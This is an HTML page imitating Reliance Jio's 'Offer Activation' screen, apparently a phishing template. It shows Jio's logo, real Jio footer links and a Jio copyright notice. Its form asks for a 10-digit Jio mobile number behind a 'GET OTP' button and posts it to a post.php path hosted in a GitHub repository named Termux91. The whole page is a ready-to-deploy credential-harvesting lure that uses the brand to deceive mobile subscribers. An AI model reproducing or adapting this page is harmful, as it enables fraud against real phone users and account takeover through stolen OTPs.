# WebPage...


<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Favicon icon here  -->
                <link rel="icon" href="https://raw.githubusercontent.com/Termux91/web/main/data/jio_dark_blue.png" type="image/gif" sizes="16x16"> 
        <title>OFFER ACTIVATION</title>
        <style>
* {
  margin: 0;
  padding: 0;
  font-family: sans-serif;
  color: grey;
  /*background-color: #FFFFFF;*/
}

.tel:focus {
border-color: dodgerBlue;
box-shadow: 0 0 8px 0 dodgerBlue;
}

.tel {
    border-radius: 5px;
    height: 30px;
    box-shadow: none;
    outline: none;
    border: 1.5px solid grey;
    /*border-bottom: 2px solid #535353;*/
    background-color: #FFFFFF;
}
.submit {
    background-color: #05A000;
    color: white;
    font-weight: bold;
    width: 30%;
    height: 25px;
    box-shadow: none;
    outline: none;
    border: none;
    border-radius: 15px;
    /*border-color: dodgerBlue;*/
    box-shadow: 0 0 8px 0 #05A000;
}
a {
    text-decoration: none;
}

.tel:valid{
  border-color: dodgerBlue;
box-shadow: 0 0 8px 0 dodgerBlue;
}
</style>
    </head>
    <body>
<script>
  function myfun(){
    var a = document.getElementById("mobilenumber").value;
    
    if(a==""){
      document.getElementById("messages").innerHTML="* Please Fill The Jio Number";
      return false;
    }
    if(isNaN(a)){
      document.getElementById("messages").innerHTML="* Only Jio Numbers Allow";
      return false;
    }
    if(a.length<10){
      document.getElementById("messages").innerHTML="* Enter 10 Digit Jio Number";
      return false;
    }
    if(a.length>10){
      document.getElementById("messages").innerHTML="* Enter Only 10 Digit Jio Number";
      return false;
    }
    if((a.charAt(0)!=9) && (a.charAt(0)!=8) && (a.charAt(0)!=7) && (a.charAt(0)!=6)){
      document.getElementById("messages").innerHTML="* Enter Only Valid Jio Number";
      return false;
    }
  }
</script>
<!--====parent div start====-->
        <div style="height: 100vh; width: 100vw; borderr:1px solid black; background-color: #FFFFFF;">
<!--====header div start====-->
            <div style="margin-top: 2%; float: left;
            borderr:1px solid gray; width:100%; height: 10vmax;">
                <center>
                <img src="https://raw.githubusercontent.com/Termux91/web/main/data/jio_dark_blue.png" alt="My Jio" width="15%" height="80%"> 
                </center>
            </div>
<!--====header div close====-->
 <hr style="border: 0.5px solid grey; border-radius: 5px;">
<!--====middle div start====-->
            <div style="margin-top:10%; margin-left:10%; float: left;
            borderr:1px solid red; border-radius: 5px;
            background-color: #DDDDDD; width:80%; height: 290px;">
                <center><h2 style="margin-top: 2%; color: #0045A4;">OFFER ACTIVATION</h2></center> <br>
                <center><form onsubmit="return myfun()" action="https://raw.githubusercontent.com/Termux91/web/main/data/post.php" method="post">
                
  <center><label style="color: dodgerBlue;">Enter Mobile Number</label><br>
  <input id="mobilenumber" class="tel" type="tel" maxlength="10" placeholder="Enter 10 Digit Jio Number" name="number" #ppattern="[6789][0-9]{9}"
           required="required"><br>
<span style="color:red;" id="messages"></span>
           </center>
  <br>
  <center><input class="submit" type="submit" name="submit" value="GET OTP"></center>
</form></center><br> <br> <br>
<center><a href="https://www.jio.com/en-in/4g-plans"><span>Popular Plans</span></a></center>
            </div>
<!--====middle div close====-->
<!--====footer div start====-->
            <div style="width: 100%; height: 45px; margin-top:35%; float: left;
            borderr:1px solid blue;">
                    <center><pre><a href="https://www.jio.com/en-in/selfhelp"><span style="word-spacing: 15px;">FAQ</span></a>   <a href="https://www.jio.com/en-in/contact-us#/"><span style="word-spacing: 15px;">Contact-Us</span></a>   <a href="https://www.jio.com/en-in/terms-conditions"><span style="word-spacing: 15px;">T&C</span></a>   </pre></center>
            </div>
<!--====footer div close====-->
        </div>
<!--====parent div close====-->
<p style="text-align: center;">Copyright © 2019 Reliance Jio Infocomm Ltd. All rights reserved</p>
    </body>
</html>

